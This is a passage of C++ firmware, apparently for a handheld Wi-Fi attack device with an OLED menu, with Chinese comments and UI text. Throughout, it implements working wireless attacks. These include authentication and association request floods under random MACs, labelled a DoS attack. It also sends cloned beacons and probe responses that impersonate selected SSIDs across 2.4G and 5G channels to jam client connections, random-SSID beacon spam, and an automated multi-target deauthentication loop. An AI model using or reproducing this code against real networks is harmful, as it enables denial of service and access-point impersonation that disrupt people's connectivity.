    for (int x = 0; x < sendCount; x++) {
      wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // 克隆之间的延时
  }
}

// ===== 连接干扰：跨信道伪造同名信标与探测响应 =====

// 复用函数：绘制连接干扰攻击状态页面
void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    display.clearDisplay();
  }
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 标题行
  oledDrawCenteredLine("[多信道干扰中]", 18);
  
  // SSID行
  oledDrawCenteredLine(ssid.c_str(), 32);
  
  // 底部提示行
  const char* bottomHint = "尽可能靠近目标客户端";
  int hintWidth = u8g2_for_adafruit_gfx.getUTF8Width(bottomHint);
  int hintX = (display.width() - hintWidth) / 2;
  u8g2_for_adafruit_gfx.setCursor(hintX, 46);
  u8g2_for_adafruit_gfx.print(bottomHint);
  
  if (clearDisplay) {
    display.display();
  }
}

// ===== 请求发送：高效认证/关联请求泛洪 =====
void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    display.clearDisplay();
  }
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("[Dos攻击帧发送中]", 18);
  oledDrawCenteredLine(ssid.c_str(), 32);
  if (clearDisplay) display.display();
}

void RequestFlood() {
  if (SelectedVector.empty()) {
    showModalMessage("未找到有效SSID");
    return;
  }

  // 多选目标时显示第一个目标的SSID，但攻击所有选中的目标
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "多目标攻击中";
  }

  drawRequestFloodStatus(displaySSID);
  startAttackLED();

  // 预构建所有目标的信息
  struct TargetInfo {
    String ssid;
    const uint8_t* bssid;
    int channel;
  };
  
  std::vector<TargetInfo> targets;
  targets.reserve(SelectedVector.size());
  
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
      TargetInfo target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      targets.push_back(target);
    }
  }

  uint8_t staMac[6];
  AuthReqFrame arf; size_t arflen;
  AssocReqFrame asf; size_t asflen;

  while (true) {
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      stabilizeButtonState();
      if (showConfirmModal("停止Dos攻击")) {
        break;
      } else {
        startAttackLED();
        drawRequestFloodStatus(displaySSID);
      }
    }

    // 对每个目标进行攻击
    for (const auto& target : targets) {
      wext_set_channel(WLAN0_NAME, target.channel);

      // 更换随机STA MAC，构建并突发发送
      generateRandomMAC(staMac);
      arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
      asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);

      // 突发：先多次认证，再多次关联，最大化解析概率
      for (int i = 0; i < 10; i++) { wifi_tx_raw_frame(&arf, arflen); }
      for (int i = 0; i < 8; i++) { wifi_tx_raw_frame(&asf, asflen); }
      
      delay(2); // 目标间微小延时
    }
  }
}

void LinkJammer() {
  if (SelectedVector.empty()) {
    showModalMessage("未找到有效SSID");
    return;
  }

  // 多选目标时显示第一个目标的SSID，但攻击所有选中的目标
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "多目标攻击中";
  }

  // 使用复用函数绘制初始状态页面
  drawLinkJammerStatusPage(displaySSID);
  
  // LED提示
  startAttackLED();

  // 预构建所有目标的帧缓冲
  struct TargetFrame {
    String ssid;
    const uint8_t* bssid;
    int channel;
    BeaconFrame bf;
    size_t blen;
    ProbeRespFrame prf;
    size_t prlen;
  };
  
  std::vector<TargetFrame> targets;
  targets.reserve(SelectedVector.size());
  
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
      TargetFrame target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      
      // 预构建帧缓冲
      uint8_t tempMac[6];
      memcpy(tempMac, target.bssid, 6);
      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);
      
      targets.push_back(target);
    }
  }

  // 目标信道列表：全表
  std::vector<int> channels;
  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
  for (int ch : allChannels) channels.push_back(ch);



  while (true) {
    // 停止条件：OK/BACK 任意键 -> 确认
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      // 稳定按键状态，为确认弹窗做准备
      stabilizeButtonState();
      if (showConfirmModal("停止连接干扰")) {
        break;
      } else {
        // 取消则继续攻击，重新启动LED和显示
        startAttackLED();
        drawLinkJammerStatusPage(displaySSID);
      }
    }

    for (int ch : channels) {
      // 在每个信道处理前检查按键状态
      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
        delay(200);
        // 稳定按键状态，为确认弹窗做准备
        stabilizeButtonState();
        if (showConfirmModal("停止连接干扰")) {
          return; // 直接返回，退出整个函数
        } else {
          // 取消则继续攻击，重新启动LED和显示
          startAttackLED();
          drawLinkJammerStatusPage(displaySSID);
        }
      }
      
      wext_set_channel(WLAN0_NAME, ch);
      
      // 对每个目标发送帧，按信道分组优化效率
      for (const auto& target : targets) {
        // 降低突发发送速率，防止设备过载
        for (int i = 0; i < 7; i++) {
          wifi_tx_raw_frame((void*)&target.bf, target.blen);
          delay(1); // 微小延时防止过载
        }
        for (int i = 0; i < 10; i++) {
          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
          delay(1); // 微小延时防止过载
        }
        delay(1); // 目标间微小延时
      }
      delay(3); // 信道间延时
    }
  }
}

// 在指定信道上发送信标帧（Web UI版本，使用BeaconFrame）
void sendBeaconOnChannelWeb(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    // WebUI路径：与"暴力克隆"一致，为名称添加随机后缀；同时保证总长度<=32字节
    // 后缀形如 "(ab)"，固定4字节（ASCII）。
    int maxBaseBytes = 32 - 4; if (maxBaseBytes < 0) maxBaseBytes = 0;
    String base = utf8TruncateByBytes(String(ssid), maxBaseBytes);
    String fakeSsid = createFakeSSID(base);
    const char *fakeSsidCstr = fakeSsid.c_str();
    
    BeaconFrame bf; 
    size_t blen = wifi_build_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr, bf);
    
    for (int x = 0; x < sendCount; x++) {
      wifi_tx_raw_frame(&bf, blen);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // 克隆之间的延时
  }
}

// 执行跨频段信标攻击的核心逻辑
void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool isStableMode = false) {
  // 攻击参数配置
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };
  
  AttackConfig config;
  if (isStableMode) {
    // 稳定模式
    config = {5, 3, 4, 2, 2};
  } else {
    // 暴力模式
    config = {10, 5, 8, 4, 0};
  }
  
  if (is24GChannel(originalChannel)) {
    // 2.4G频段SSID：在原始信道和5G频段常用信道上都发送信标
    
    // 原始2.4G信道
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 5G频段同名信标帧（在常用5G信道上）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannel(fiveGCh, ssid.c_str(), 
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(15); // 不同信道之间的延时
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5G频段SSID：在原始信道和2.4G频段常用信道上都发送信标
    
    // 原始5G信道
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 2.4G频段同名信标帧（在常用2.4G信道上）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 常用2.4G信道
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannel(two4GCh, ssid.c_str(), 
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(15); // 不同信道之间的延时
      }
    }
  }
}
// 执行跨频段信标攻击的核心逻辑（Web UI版本）
void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bool isStableMode = false) {
  // 攻击参数配置
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };
  
  AttackConfig config;
  if (isStableMode) {
    // 稳定模式
    config = {10, 3, 4, 2, 2};
  } else {
    // 暴力模式
    config = {10, 5, 8, 4, 0};
  }
  
  if (is24GChannel(originalChannel)) {
    // 2.4G频段SSID：在原始信道和5G频段常用信道上都发送信标
    
    // 原始2.4G信道
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 5G频段同名信标帧（在常用5G信道上）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(), 
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(15); // 不同信道之间的延时
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5G频段SSID：在原始信道和2.4G频段常用信道上都发送信标
    
    // 原始5G信道
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }
    
    // 2.4G频段同名信标帧（在常用2.4G信道上）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 常用2.4G信道
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannelWeb(two4GCh, ssid.c_str(), 
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(15); // 不同信道之间的延时
      }
    }
  }
}
void Beacon() {
  Serial.println("=== 启动克隆已选AP(暴力) ===");
  Serial.println("攻击模式: 克隆已选AP(暴力)");
  Serial.println("攻击强度: 10");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("正在克隆信标帧", 25);
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED行区域：显示生成的SSID，单目标0.5s，多目标1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        BeaconMenu();
        break;
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
      // 重新绘制攻击状态页面，避免确认弹窗残留
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("正在克隆信标帧", 25);
    }

    if (!SelectedVector.empty()) {
      // 单目标：仅绘制一次；多目标：1s刷新
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;
          
          // 使用通用跨频段信标攻击函数（暴力模式）
          executeCrossBandBeaconAttack(ssid1, ch, false);

          // 单目标仅绘制一次；多目标定时刷新
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // 如果没有选择特定SSID，攻击所有扫描到的网络（视为多目标，1s刷新）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;
        
        // 使用通用跨频段信标攻击函数（暴力模式）
        executeCrossBandBeaconAttack(ssid1, ch, false);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}

void StableBeacon() {
  Serial.println("=== 启动克隆已选AP(稳定) ===");
  Serial.println("攻击模式: 克隆已选AP(稳定)");
  Serial.println("攻击强度: 5 (稳定模式)");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("正在克隆信标帧", 25);
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED行区域：显示生成的SSID，单目标0.5s，多目标1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        BeaconMenu();
        break;
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
      // 重新绘制攻击状态页面，避免确认弹窗残留
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("正在克隆信标帧", 25);
    }

    if (!SelectedVector.empty()) {
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;
          
          // 使用通用跨频段信标攻击函数（稳定模式）
          executeCrossBandBeaconAttack(ssid1, ch, true);

          // 单目标仅绘制一次；多目标定时刷新
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // 如果没有选择特定SSID，攻击所有扫描到的网络（视为多目标，1s刷新）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;
        
        // 使用通用跨频段信标攻击函数（稳定模式）
        executeCrossBandBeaconAttack(ssid1, ch, true);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}
// OLED 频段选择菜单：综合 / 5G / 2.4G
// 返回 true 表示确认并已写入 beaconBandMode；返回 false 表示取消（BACK）
bool BeaconBandMenu() {
  int state = beaconBandMode; // 初始光标基于当前模式
  
  while (true) {
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return false;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      beaconBandMode = state;
      return true;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (state > 0) state--;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (state < 2) state++;
    }

    display.clearDisplay();
    display.setTextSize(1);
    
    // 显示标题
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(32, 12);
    u8g2_for_adafruit_gfx.print("[选择发包频段]");
    
    // 选项顺序：综合，5G，2.4G
    const char* items[] = {"混合(2.4G+5G)", "5G 频段", "2.4G 频段"};
    for (int i = 0; i < 3; i++) {
      int yPos = 20 + i * 16; // 从第20行开始，为标题留出空间
      if (i == state) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(items[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(items[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    display.display();
    delay(50);
  }
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
void RandomBeacon() {
  Serial.println("=== 启动随机信标攻击 ===");
  Serial.println("攻击模式: 随机信标攻击");
  Serial.println("攻击强度: 10");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("随机信标攻击中", 25);
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED行区域：在"攻击中..."下一行显示SSID（尽量少刷新）
  const int ssidLineY = 42; // 行基线
  static unsigned long lastSSIDDrawMs = 0;
  const unsigned long randomSSIDIntervalMs = 500; // 0.5s 刷新

  std::vector<int> targetChannels;
  
  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
        int channel = scan_results[selectedIndex].channel;
        bool channelExists = false;
        for (int existingChannel : targetChannels) {
          if (existingChannel == channel) {
            channelExists = true;
            break;
          }
        }
        if (!channelExists) {
          // 根据频段选择过滤
          bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
          if (include) targetChannels.push_back(channel);
        }
      }
    }
  } else {
    for (int channel : allChannels) {
      bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
      if (include) targetChannels.push_back(channel);
    }
  }

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        BeaconMenu();
        break;
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
      // 重新绘制攻击状态页面，避免确认弹窗残留
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("随机信标攻击中", 25);
    }

    int randomIndex = random(0, targetChannels.size());
    int randomChannel = targetChannels[randomIndex];
    
    String ssid2 = generateRandomString(10);
    
    for (int i = 0; i < 6; i++) {
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME, randomChannel);
    
    for (int x = 0; x < 5; x++) {
      wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
    }

    // 综合模式：交替另一个频段的一个快速信标，提升感知覆盖
    if (beaconBandMode == 0) {
      // 简单策略：从另一个频段挑一个固定常用信道
      int altCh = is24GChannel(randomChannel) ? 36 : 6;
      wext_set_channel(WLAN0_NAME, altCh);
      for (int x = 0; x < 2; x++) {
        wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
      }
    }

    // 刷新OLED中部SSID显示（每0.5秒一次，居中显示）
    oledMaybeDrawCenteredLine(ssid_cstr2, ssidLineY, lastSSIDDrawMs, randomSSIDIntervalMs);
  }
}
int becaonstate = 0;

void BeaconMenu(){
  becaonstate = 0;
  
  // 去抖，与首页/攻击页一致
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // 修复：确保弹窗弹出时无残留按键
      if(becaonstate == 0){
        if (BeaconBandMenu()) {
          if (showConfirmModal("执行随机信标帧攻击")) {
            RandomBeacon();
            break;
          }
        }
        // 未确认则留在当前菜单
      }
      if(becaonstate == 1){
        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("执行信标帧攻击")) {
              Beacon();
              break;
            }
          }
        }
        // 未确认则留在当前菜单
      }
      if(becaonstate == 2){
        if (SelectedVector.empty()) { showModalMessage("请先选择AP/SSID"); }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("执行信标帧攻击")) {
              StableBeacon();
              break;
            }
          }
        }
        // 未确认则留在当前菜单
      }
      if(becaonstate == 3){
        drawattack();
        break;
      }
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate > 0){
        int yFrom = 2 + becaonstate * 16;
        becaonstate--;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate < 3){
        int yFrom = 2 + becaonstate * 16;
        becaonstate++;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项
    const char* menuItems[] = {
      "随机信标攻击",
      "克隆已选AP(暴力)",
      "克隆已选AP(稳定)",
      "《 返回 》"
    };
    
    // 显示菜单项 - 统一高度14，间距2，总步长16，适配128x64
    for (int i = 0; i < 4; i++) {
      int yPos = 2 + i * 16;
      if (i == becaonstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    
    display.display();
    delay(50);
  }
}

// 稳定自动多重：逐信道轮询，目标按信道分组，burst 内使用细微 interFrameDelayMs
void StableAutoMulti() {
  Serial.println("=== 启动稳定自动多重攻击 ===");
  Serial.println("攻击模式: 稳定自动多重攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("稳定自动多重攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 600;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 120;

  // 初始化目标列表（与 AutoMulti 一致）
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
  if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  // 配置：每个BSSID一次 burst = perdeauth 轮，帧间延时细微节拍
  const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定

  while (true) {
    // 更新攻击状态显示
    showAttackStatusPage("稳定自动多重攻击中");

    unsigned long currentTime = millis();

    // LED 闪烁
    if (currentTime - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // 按钮检查
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
        // 显示确认弹窗
        if (showConfirmModal("确认停止攻击")) {
          return; // 确认停止攻击
        }
        // 取消则继续攻击，重新启动LED
        startAttackLED();
      }
      buttonCheckTime = currentTime;
    }

    // 定期刷新活跃目标（沿用10分钟节奏）
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results;
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup);
      }
      lastScanTime = currentTime;
    }

    if (smartTargets.empty()) {
      delay(100);
      continue;
    }

    // 按信道分组，逐信道轮询，减少切换（复用缓存）
    channelBucketsCache.clearBuckets();
    for (const auto &t : smartTargets) {
      channelBucketsCache.add(t.channel, t.bssid);
    }

    int packetCount = 0;
    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
      if (channelBucketsCache.buckets[chIdx].empty()) continue;
      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        // 使用微秒级burst（循环原因码），减少调用开销并提升有效速率
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);

        if (packetCount >= 200) { // 更细节的节拍提示阈值
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
